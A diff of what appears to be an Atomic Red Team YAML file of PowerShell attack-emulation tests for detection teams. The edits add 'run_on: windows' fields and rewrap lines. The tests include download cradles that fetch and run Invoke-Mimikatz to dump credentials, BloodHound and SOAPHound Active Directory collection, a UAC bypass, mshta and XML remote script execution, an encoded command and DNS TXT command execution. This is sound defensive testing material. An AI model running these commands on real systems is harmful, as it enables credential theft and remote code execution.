@@ -11,12 +11,15 @@ atomic_tests:
     mimurl:
       description: Mimikatz url
       type: url
-      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+      default: 
+        https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
   executor:
     command: |
       powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
     name: command_prompt
     elevation_required: true
+  run_on:
+  - windows
 - name: Run BloodHound from local disk
   auto_generated_guid: a21bb23e-e677-4ee7-af90-6931b57b6350
   description: |
@@ -43,6 +46,8 @@ atomic_tests:
     cleanup_command: |
       Remove-Item $env:Temp\*BloodHound.zip -Force
     name: powershell
+  run_on:
+  - windows
 - name: Run Bloodhound from Memory using Download Cradle
   auto_generated_guid: bf8c1441-4674-4dab-8e4e-39d93d08f9b7
   description: |
@@ -60,6 +65,8 @@ atomic_tests:
     cleanup_command: |
       Remove-Item $env:Temp\*BloodHound.zip -Force
     name: powershell
+  run_on:
+  - windows
 - name: Mimikatz - Cradlecraft PsSendKeys
   auto_generated_guid: af1800cf-9f9d-4fd1-a709-14b1e6de020d
   description: |
@@ -71,6 +78,8 @@ atomic_tests:
       $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
     name: powershell
     elevation_required: true
+  run_on:
+  - windows
 - name: Invoke-AppPathBypass
   auto_generated_guid: 06a220b6-7e29-4bd8-9d07-5b4d86742372
   description: |
@@ -83,6 +92,8 @@ atomic_tests:
     command: |
       Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
     name: command_prompt
+  run_on:
+  - windows
 - name: Powershell MsXml COM object - with prompt
   auto_generated_guid: 388a7340-dbc1-4c9d-8e59-b75ad8c6d5da
   description: |
@@ -95,11 +106,14 @@ atomic_tests:
     url:
       description: url of payload to execute
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
   executor:
     command: |
       powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
     name: command_prompt
+  run_on:
+  - windows
 - name: Powershell XML requests
   auto_generated_guid: 4396927f-e503-427b-b023-31049b9b09a6
   description: |
@@ -112,11 +126,14 @@ atomic_tests:
     url:
       description: url of payload to execute
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml
   executor:
     command: |
       "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
     name: command_prompt
+  run_on:
+  - windows
 - name: Powershell invoke mshta.exe download
   auto_generated_guid: 8a2ad40b-12c7-4b25-8521-2737b0a415af
   description: |
@@ -129,11 +146,14 @@ atomic_tests:
     url:
       description: url of payload to execute
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct
   executor:
     command: |
       C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
     name: command_prompt
+  run_on:
+  - windows
 - name: Powershell Invoke-DownloadCradle
   auto_generated_guid: cc50fa2a-a4be-42af-a88f-e347ba0bf4d7
   description: |
@@ -146,6 +166,8 @@ atomic_tests:
       1. Open Powershell_ise as a Privileged Account
       2. Invoke-DownloadCradle.ps1
     name: manual
+  run_on:
+  - windows
 - name: PowerShell Fileless Script Execution
   auto_generated_guid: fa050f5e-bc75-4230-af73-b6fd7852cd73
   description: |
@@ -162,6 +184,8 @@ atomic_tests:
       Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
       Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
     name: powershell
+  run_on:
+  - windows
 - name: NTFS Alternate Data Stream Access
   auto_generated_guid: 8e5c5532-1181-4c1d-bb79-b3a9f5dbd680
   description: |
@@ -189,6 +213,8 @@ atomic_tests:
     cleanup_command: |
       Remove-Item #{ads_file} -Force -ErrorAction Ignore
 
+  run_on:
+  - windows
 - name: PowerShell Session Creation and Use
   auto_generated_guid: 7c1acec2-78fa-4305-a3e0-db2a54cddecd
   description: |
@@ -200,7 +226,8 @@ atomic_tests:
 
   input_arguments:
     hostname_to_connect:
-      description: The host to connect to, by default it will connect to the local machine
+      description: The host to connect to, by default it will connect to the local
+        machine
       type: string
       default: $env:COMPUTERNAME
 
@@ -228,6 +255,8 @@ atomic_tests:
       Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
       Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
 
+  run_on:
+  - windows
 - name: ATHPowerShellCommandLineParameter -Command parameter variations
   auto_generated_guid: 686a9785-f99b-41d4-90df-66ed515f81d7
   description: Executes powershell.exe with variations of the -Command parameter
@@ -243,7 +272,8 @@ atomic_tests:
       type: string
       default: C
   dependencies:
-  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
+  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
+      must be exported in the module.
     prereq_command: |-
       $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
       if (-not $RequiredModule) {exit 1}
@@ -251,12 +281,17 @@ atomic_tests:
     get_prereq_command: |
       Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
   executor:
-    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop'
+    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
+      -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop'
     name: powershell
 
-- name: ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
+  run_on:
+  - windows
+- name: ATHPowerShellCommandLineParameter -Command parameter variations with encoded
+    arguments
   auto_generated_guid: 1c0a870f-dc74-49cf-9afc-eccc45e58790
-  description: Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied
+  description: Executes powershell.exe with variations of the -Command parameter with
+    encoded arguments supplied
   supported_platforms:
   - windows
   input_arguments:
@@ -273,7 +308,8 @@ atomic_tests:
       type: string
       default: EA
   dependencies:
-  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
+  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
+      must be exported in the module.
     prereq_command: |-
       $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
       if (-not $RequiredModule) {exit 1}
@@ -281,9 +317,13 @@ atomic_tests:
     get_prereq_command: |
       Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
   executor:
-    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop'
+    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
+      -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation
+      #{encoded_arguments_param_variation} -Execute -ErrorAction Stop'
     name: powershell
 
+  run_on:
+  - windows
 - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
   auto_generated_guid: 86a43bad-12e3-4e85-b97c-4d5cf25b95c3
   description: Executes powershell.exe with variations of the -EncodedCommand parameter
@@ -299,7 +339,8 @@ atomic_tests:
       type: string
       default: E
   dependencies:
-  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
+  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
+      must be exported in the module.
     prereq_command: |-
       $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
       if (-not $RequiredModule) {exit 1}
@@ -307,12 +348,18 @@ atomic_tests:
     get_prereq_command: |
       Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
   executor:
-    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop'
+    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
+      -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction
+      Stop'
     name: powershell
 
-- name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
+  run_on:
+  - windows
+- name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with
+    encoded arguments
   auto_generated_guid: 0d181431-ddf3-4826-8055-2dbf63ae848b
-  description: Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied
+  description: Executes powershell.exe with variations of the -EncodedCommand parameter
+    with encoded arguments supplied
   supported_platforms:
   - windows
   input_arguments:
@@ -329,7 +376,8 @@ atomic_tests:
       type: string
       default: EncodedArguments
   dependencies:
-  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.
+  - description: The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter
+      must be exported in the module.
     prereq_command: |-
       $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
       if (-not $RequiredModule) {exit 1}
@@ -337,9 +385,14 @@ atomic_tests:
     get_prereq_command: |
       Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
   executor:
-    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop'
+    command: 'Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type}
+      -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments
+      -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute
+      -ErrorAction Stop'
     name: powershell
 
+  run_on:
+  - windows
 - name: PowerShell Command Execution
   auto_generated_guid: a538de64-1c74-46ed-aa60-b995ed302598
   description: |
@@ -350,12 +403,15 @@ atomic_tests:
     obfuscated_code:
       description: 'Defaults to: Invoke-Expression with a "Write-Host" line.'
       type: string
-      default: JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
+      default: 
+        JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
   executor:
     command: |
       powershell.exe -e  #{obfuscated_code}
     name: command_prompt
 
+  run_on:
+  - windows
 - name: PowerShell Invoke Known Malicious Cmdlets
   auto_generated_guid: 49eb9404-5e0f-4031-a179-b40f7be385e3
   description: Powershell execution of known Malicious PowerShell Cmdlets
@@ -377,6 +433,8 @@ atomic_tests:
       foreach ($cmdlets in $malcmdlets) {
           $cmdlets}
 
+  run_on:
+  - windows
 - name: PowerUp Invoke-AllChecks
   auto_generated_guid: 1289f78d-22d2-4590-ac76-166737e1811b
   description: |
@@ -391,6 +449,8 @@ atomic_tests:
     name: powershell
 
 
+  run_on:
+  - windows
 - name: Abuse Nslookup with DNS Records
   auto_generated_guid: 999bff6d-dc15-44c9-9f5c-e1051bfc86e1
   description: |
@@ -405,6 +465,8 @@ atomic_tests:
       function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
       powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
     name: powershell
+  run_on:
+  - windows
 - name: SOAPHound - Dump BloodHound Data
   auto_generated_guid: 6a5b2a50-d037-4879-bf01-43d4d6cbf73f
   description: |
@@ -445,6 +507,8 @@ atomic_tests:
     command: |
       #{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}
     name: powershell
+  run_on:
+  - windows
 - name: SOAPHound - Build Cache
   auto_generated_guid: 4099086c-1470-4223-8085-8186e1ed5948
   description: |
@@ -482,3 +546,5 @@ atomic_tests:
       #{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}
     name: powershell
 
+  run_on:
+  - windows
